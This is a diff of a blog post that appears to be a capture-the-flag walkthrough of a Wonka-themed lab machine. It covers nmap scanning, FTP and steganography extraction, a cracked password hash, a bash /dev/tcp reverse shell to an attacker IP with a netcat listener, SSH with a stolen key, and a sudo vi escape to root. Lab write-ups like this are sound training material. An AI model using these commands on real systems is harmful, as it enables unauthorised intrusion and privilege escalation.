@@ -17,45 +17,19 @@ comments: false
 ## We start of by enumerating the open ports with nmap
 
 ## Looking at our output we see:
-{% highlight bash %}
-Not shown: 989 closed tcp ports (reset)
-PORT    STATE SERVICE
-21/tcp  open  ftp
-22/tcp  open  ssh
-80/tcp  open  http
-100/tcp open  newacct
-106/tcp open  pop3pw                                                                                                                                                                                        
-109/tcp open  pop2                                                                                                                                                                                          
-110/tcp open  pop3                                                                                                                                                                                          
-111/tcp open  rpcbind                                                                                                                                                                                       
-113/tcp open  ident                                                                                                                                                                                         
-119/tcp open  nntp                                                                                                                                                                                          
-125/tcp open  locus-map                     
-{% endhighlight bash %}
-
-![Battery Widget]({{ '/assets/images/wonka/1-wonka.png' | relative_url }})
-
+![img]({{ '/assets/images/wonka/1-wonka.png' | relative_url }}){: .center-image }
+<br>
 
 ## Running our Nmap scan with the -sCV flag shows us where to find "the key"
-
-{% highlight bash %}
-13/tcp open  ident?
-| fingerprint-strings: 
-|   DNSVersionBindReqTCP, GenericLines, LDAPBindReq, NULL: 
-|_    http://localhost/key_rev_key <- You will find the key here!!!
-{% endhighlight bash %}
-
 ## Here we can see text that shows us the directory path of the secret key
-
-
-![Battery Widget]({{ '/assets/images/wonka/2-wonka.png' | relative_url }})
+![img]({{ '/assets/images/wonka/2-wonka.png' | relative_url }}){: .center-image }
+<br>
 
 ## Moving here on our webpage we can download the key_rev_key file
 {% highlight bash %}
 http://x.x.x.x/key_rev_key
 {% endhighlight bash %}
-
-![Battery Widget]({{ '/assets/images/wonka/3-wonka.png' | relative_url }})
+![Battery Widget]({{ '/assets/images/wonka/3-wonka.png' | relative_url }}){: .center-image }
 
 ## Looking at this file we can see it's an elf file and already compiled
 
@@ -72,7 +46,7 @@ chmod +x key_rev_key
 
 ## Now lets run it again
 
-![Battery Widget]({{ '/assets/images/wonka/4-wonka.png' | relative_url }})
+![Battery Widget]({{ '/assets/images/wonka/4-wonka.png' | relative_url }}){: .center-image }
 
 ## Looks like it's asking for a name
 
@@ -87,7 +61,7 @@ $ strings key_rev_key
 {% endhighlight bash %}
 
 
-![Battery Widget]({{ '/assets/images/wonka/5-wonka.png' | relative_url }})
+![Battery Widget]({{ '/assets/images/wonka/5-wonka.png' | relative_url }}){: .center-image }
 
 {% highlight bash %}
  congratulations you have found the key:   
@@ -117,7 +91,7 @@ PORT   STATE SERVICE VERSION
 {% endhighlight bash %}
 
 
-![Battery Widget]({{ '/assets/images/wonka/6-wonka.png' | relative_url }})
+![Battery Widget]({{ '/assets/images/wonka/6-wonka.png' | relative_url }}){: .center-image }
 
 
 
@@ -126,7 +100,7 @@ PORT   STATE SERVICE VERSION
 ## Lets logon to the ftp server
 
 
-![Battery Widget]({{ '/assets/images/wonka/7-wonka.png' | relative_url }})
+![Battery Widget]({{ '/assets/images/wonka/7-wonka.png' | relative_url }}){: .center-image }
 
 ## We see 'gum_room.txt' file
 
@@ -136,7 +110,7 @@ PORT   STATE SERVICE VERSION
 >> get gum_room.jpg
 {% endhighlight bash %}
 
-![Battery Widget]({{ '/assets/images/wonka/8-wonka.png' | relative_url }})
+![Battery Widget]({{ '/assets/images/wonka/8-wonka.png' | relative_url }}){: .center-image }
 
 
 ## Running strings on the file doesn't show us much usefule output
@@ -147,7 +121,7 @@ $ steghide extract -sf gun_room.jpg
 (no password)
 {% endhighlight bash %}
 
-![Battery Widget]({{ '/assets/images/wonka/9-wonka.png' | relative_url }})
+![Battery Widget]({{ '/assets/images/wonka/9-wonka.png' | relative_url }}){: .center-image }
 
 
 ## We get our output in the b64.txt file
@@ -168,7 +142,7 @@ $ steghide extract -sf gun_room.jpg
 
 ## It works and we get the password for Charlie !
 
-![Battery Widget]({{ '/assets/images/wonka/10-wonka.png' | relative_url }})
+![Battery Widget]({{ '/assets/images/wonka/10-wonka.png' | relative_url }}){: .center-image }
 
 {% highlight bash %}
 charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:cn7824
@@ -183,7 +157,7 @@ _____________________________________________________
 ## Lets try and access the web server instead
 
 
-![Battery Widget]({{ '/assets/images/wonka/11-wonka.png' | relative_url }})
+![Battery Widget]({{ '/assets/images/wonka/11-wonka.png' | relative_url }}){: .center-image }
 
 {% highlight bash %}
 Charlie
@@ -194,7 +168,7 @@ cn7824
 ## We are able to login successfully as Charlie
 ## We see that there is immediately a command prompt box
 
-![Battery Widget]({{ '/assets/images/wonka/12-wonka.png' | relative_url }})
+![Battery Widget]({{ '/assets/images/wonka/12-wonka.png' | relative_url }}){: .center-image }
 
 
 ## Lets build a reverse shell and start our netcat listener
@@ -215,7 +189,7 @@ $ nc -lvnp <port of choice>
 /bin/bash -c 'bash -i >& /dev/tcp/10.2.3.233/4444 0>&1'
 {% endhighlight bash %}
 
-![Battery Widget]({{ '/assets/images/wonka/13-wonka.png' | relative_url }})
+![Battery Widget]({{ '/assets/images/wonka/13-wonka.png' | relative_url }}){: .center-image }
 
 
 ## This gives us a shell back to our listener
@@ -223,7 +197,7 @@ $ nc -lvnp <port of choice>
 ## But we only have www-data access
 
 
-![Battery Widget]({{ '/assets/images/wonka/14-wonka.png' | relative_url }})
+![Battery Widget]({{ '/assets/images/wonka/14-wonka.png' | relative_url }}){: .center-image }
 
 
 
@@ -234,7 +208,7 @@ $ nc -lvnp <port of choice>
 
 ## Opening this, we can see the private key inside: >"/home/charlie/teleport"
 
-![Battery Widget]({{ '/assets/images/wonka/15-wonka.png' | relative_url }})
+![Battery Widget]({{ '/assets/images/wonka/15-wonka.png' | relative_url }}){: .center-image }
 
 ## Lets save this into a text file on our machine
 ## Lets modify the permissions and see if we can get ssh access with these credentials
@@ -255,7 +229,7 @@ ssh -i id_rsa_file charlie@xxxx
 ## We get access as Charlie !
 
 
-![Battery Widget]({{ '/assets/images/wonka/16-wonka.png' | relative_url }})
+![Battery Widget]({{ '/assets/images/wonka/16-wonka.png' | relative_url }}){: .center-image }
 
 ## Lets capture that user flag
 
@@ -263,7 +237,7 @@ ssh -i id_rsa_file charlie@xxxx
 cat /home/charlie/user.txt
 {% endhighlight bash %}
 
-![Battery Widget]({{ '/assets/images/wonka/17-wonka.png' | relative_url }})
+![Battery Widget]({{ '/assets/images/wonka/17-wonka.png' | relative_url }}){: .center-image }
 
 
 # Priv Esc
@@ -271,7 +245,7 @@ cat /home/charlie/user.txt
 
 ## We see sudo -l shows Charlie can run vi commands as root
 
-![Battery Widget]({{ '/assets/images/wonka/18-wonka.png' | relative_url }})
+![Battery Widget]({{ '/assets/images/wonka/18-wonka.png' | relative_url }}){: .center-image }
 
 ## Looking for binary exploits we see a vi script:
 (gtfobins/vi/#sudo)[https://gtfobins.github.io/gtfobins/vi/#sudo]
@@ -283,7 +257,7 @@ $ sudo vi -c ':!/bin/sh' /dev/null
 ## Entering this command is successful
 ## We get root access
 
-![Battery Widget]({{ '/assets/images/wonka/19-wonka.png' | relative_url }})
+![Battery Widget]({{ '/assets/images/wonka/19-wonka.png' | relative_url }}){: .center-image }
 
 ## look like the root flag is contained within a python script:
 
@@ -291,14 +265,14 @@ $ sudo vi -c ':!/bin/sh' /dev/null
 ./root.py
 {% endhighlight bash %}
 
-![Battery Widget]({{ '/assets/images/wonka/20-wonka.png' | relative_url }})
+![Battery Widget]({{ '/assets/images/wonka/20-wonka.png' | relative_url }}){: .center-image }
 
 ## Lets try an run it:
 {% highlight bash %}
 python3 ./root.py
 {% endhighlight bash %}
 
-![Battery Widget]({{ '/assets/images/wonka/21-wonka.png' | relative_url }})
+![Battery Widget]({{ '/assets/images/wonka/21-wonka.png' | relative_url }}){: .center-image }
 
 ## Looks like we need the key we found earlier
 
@@ -306,6 +280,6 @@ python3 ./root.py
 >b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
 {% endhighlight bash %}
 
-![Battery Widget]({{ '/assets/images/wonka/22-wonka.png' | relative_url }})
+![Battery Widget]({{ '/assets/images/wonka/22-wonka.png' | relative_url }}){: .center-image }
  
 ## Entering this we can now get the root flag and pwn this machine !!!
